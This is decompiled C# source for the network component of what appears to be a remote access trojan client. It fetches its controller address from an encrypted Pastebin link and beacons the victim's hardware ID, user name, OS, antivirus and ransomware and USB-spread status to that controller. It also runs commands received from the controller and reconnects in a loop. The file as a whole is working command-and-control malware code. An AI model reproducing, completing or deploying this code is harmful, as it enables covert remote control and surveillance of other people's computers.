using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Client_0._5;

public class C_Socket
{
	public static string KEY = C_Settings.KEY;

	public static string SPL = C_Settings.SPL;

	public static TcpClient C;

	public static Random R = new Random();

	public static Thread T1 = new Thread(Connect);

	public static bool CNT = false;

	public static void Send(byte[] b)
	{
		if (!CNT)
		{
			return;
		}
		try
		{
			object obj = new MemoryStream();
			object[] obj2 = new object[3] { b, 0, b.Length };
			object[] array = obj2;
			bool[] obj3 = new bool[3] { true, false, false };
			bool[] array2 = obj3;
			NewLateBinding.LateCall(obj, (Type)null, "Write", obj2, (string[])null, (Type[])null, obj3, true);
			if (array2[0])
			{
				b = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(byte[]));
			}
			NewLateBinding.LateCall(obj, (Type)null, "Write", new object[3]
			{
				C_Fuctions.SB(KEY),
				0,
				KEY.Length
			}, (string[])null, (Type[])null, (bool[])null, true);
			C.Client.Send((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null)), SocketFlags.None);
			NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			CNT = false;
			ProjectData.ClearProjectError();
		}
	}

	public static void Send(string S)
	{
		Send(C_Fuctions.SB(Conversions.ToString(C_Encryption.AES_Encrypt(S))));
	}

	public static void Connect()
	{
		MemoryStream memoryStream = new MemoryStream();
		int num = 0;
		checked
		{
			while (true)
			{
				try
				{
					if (C != null && C.Client.Connected && CNT)
					{
						num++;
						if (num <= 500)
						{
							goto IL_0073;
						}
						num = 0;
						if (!(C.Client.Poll(-1, SelectMode.SelectRead) & (C.Client.Available <= 0)))
						{
							goto IL_0073;
						}
					}
					goto end_IL_0009;
					IL_0073:
					if (C.Available > 0)
					{
						byte[] array = new byte[C.Available - 1 + 1];
						C.Client.Receive(array, 0, array.Length, SocketFlags.None);
						memoryStream.Write(array, 0, array.Length);
						while (C_Fuctions.BS(memoryStream.ToArray()).Contains(KEY))
						{
							Array array2 = C_Fuctions.SplitWord(memoryStream.ToArray(), KEY);
							new Thread(delegate(object a0)
							{
								C_Commands.Data((byte[])a0);
							}).Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array2, new object[1] { 0 }, (string[])null)));
							memoryStream.Dispose();
							memoryStream = new MemoryStream();
							if (array2.Length == 2)
							{
								memoryStream.Write((byte[])NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), 0, Conversions.ToInteger(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array2, new object[1] { 1 }, (string[])null), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null)));
								continue;
							}
							break;
						}
					}
					goto IL_01aa;
					end_IL_0009:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					CNT = false;
					try
					{
						C.Client.Disconnect(reuseSocket: false);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						memoryStream.Dispose();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					memoryStream = new MemoryStream();
					try
					{
						C = new TcpClient();
						C.ReceiveTimeout = -1;
						C.SendTimeout = -1;
						C.SendBufferSize = 999999;
						C.ReceiveBufferSize = 999999;
						C.Client.SendBufferSize = 999999;
						C.Client.ReceiveBufferSize = 999999;
						num = 0;
						try
						{
							WebClient webClient = new WebClient();
							string text = Conversions.ToString(NewLateBinding.LateGet((object)webClient, (Type)null, "DownloadString", new object[1] { C_Encryption.AES_Decrypt(C_Settings.Pastebin) }, (string[])null, (Type[])null, (bool[])null));
							C_Settings.HOST = text.Split(new char[1] { ':' })[0];
							C_Settings.PORT = Conversions.ToInteger(text.Split(new char[1] { ':' })[1]);
							webClient.Dispose();
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							ProjectData.ClearProjectError();
						}
						C.Client.Connect(C_Settings.HOST, C_Settings.PORT);
						CNT = true;
						NewLateBinding.LateCall((object)null, typeof(C_Socket), "Send", new object[1] { Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("info" + SPL + C_ID.HWID() + SPL), C_ID.UserName()), (object)SPL), (object)Path.GetFileName(Application.get_ExecutablePath())), (object)SPL), (object)"v0.5.8C"), (object)SPL), C_ID.MyOS()), (object)" "), C_ID.Bit()), (object)SPL), (object)C_ID.INDATE()), (object)SPL), (object)C_ID.AV()), (object)SPL), C_ID.Rans()), (object)SPL), C_ID.USBSP()), (object)SPL), (object)" "), (object)SPL), (object)" ") }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						Thread.Sleep(R.Next(5000));
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_01aa:
				Thread.Sleep(1);
			}
		}
	}
}
